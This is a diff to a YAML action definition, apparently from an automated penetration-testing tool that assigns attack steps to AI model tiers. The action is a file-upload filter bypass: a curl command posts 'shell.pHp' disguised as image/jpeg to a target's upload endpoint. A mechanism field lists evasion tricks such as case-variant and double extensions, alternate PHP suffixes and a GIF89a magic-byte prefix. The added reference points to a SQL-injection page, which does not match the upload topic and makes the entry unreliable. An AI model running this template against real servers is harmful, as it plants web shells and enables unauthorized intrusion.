@@ -2,15 +2,17 @@ name: insecure_upload_bypass
 category: web
 description: File upload filter bypass
 preconditions:
-  - service.port==80
+- service.port==80
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "curl -s -F 'file=@shell.pHp;type=image/jpeg' '{target_url}/upload'"
+command_template: curl -s -F 'file=@shell.pHp;type=image/jpeg' '{target_url}/upload'
 parser: null
 expected_effects:
-  - action_completed
+- action_completed
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "Bypass extensions: .pHp, .php5, .phtml, .php.jpg. Bypass content-type: multipart type field. Bypass magic bytes: GIF89a prefix. Double extension: shell.php.jpg."
+mechanism: 'Bypass extensions: .pHp, .php5, .phtml, .php.jpg. Bypass content-type:
+  multipart type field. Bypass magic bytes: GIF89a prefix. Double extension: shell.php.jpg.'
+hacktricks_ref: pentesting-web/sql-injection/README.md
